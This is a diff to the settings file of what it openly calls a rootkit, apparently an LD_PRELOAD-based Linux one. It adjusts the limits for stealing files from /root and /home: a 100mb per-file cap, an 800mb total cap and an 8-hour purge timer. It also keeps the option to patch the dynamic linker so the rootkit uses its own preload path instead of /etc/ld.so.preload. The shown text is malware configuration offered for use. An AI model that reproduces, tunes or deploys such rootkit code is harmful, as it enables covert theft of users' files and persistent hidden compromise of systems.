@@ -85,16 +85,12 @@ INTERESTING_DIRECTORIES = ['/root', '/home']
 # when stealing files (from dirs mainly), ignore these filenames. wildcards apply. can be disabled. is by default.
 NAMES_BLACKLIST = []
 
-MAX_FILE_SIZE      = (1024 * 1024) * 20    # don't try to steal files bigger than 20mb. memory is allocated in chunks for target files. can be disabled.
+MAX_FILE_SIZE      = (1024 * 1024) * 100   # don't try to steal files bigger than 100mb. file contents are mapped into memory & written in a new background process.
 FILE_CLEANSE_TIMER = (60 * 60) * 8         # remove stolen files every 8 hours. you may want to change this value...can be disabled.
 
 # this will limit how much stuff can be stored at one time. target files that would put the current total stolen size over this value
 # will not be stolen. if SYMLINK_FALLBACK is True then a link will be created in lieu of the copied file. cap of 800mb by default. can be disabled.
 MAX_STEAL_SIZE = (1024 * 1024) * 800
-
-# block size settings for reading target files & writing their copies.
-BLOCKS_COUNT   = 10         # the default value for how many chunks files contents will be divided into.
-MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 32k default. can be disabled.
 
 # when a. copying the file fails
 #     (b. it exceeds MAX_FILE_SIZE)
@@ -114,6 +110,12 @@ SYMLINK_ONLY = False
 # patch the dynamic linker libraries as to overwrite the original /etc/ld.so.preload path with our own.
 # setting to False will instruct the rootkit to use /etc/ld.so.preload instead.
 PATCH_DYNAMIC_LINKER = True
+
+
+
+# block size settings for reading target files & writing their copies.
+BLOCKS_COUNT   = 10         # the default value for how many chunks files contents will be divided into.
+MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 32k default. can be disabled.
 
 
 # END OF ROOTKIT SETTINGS
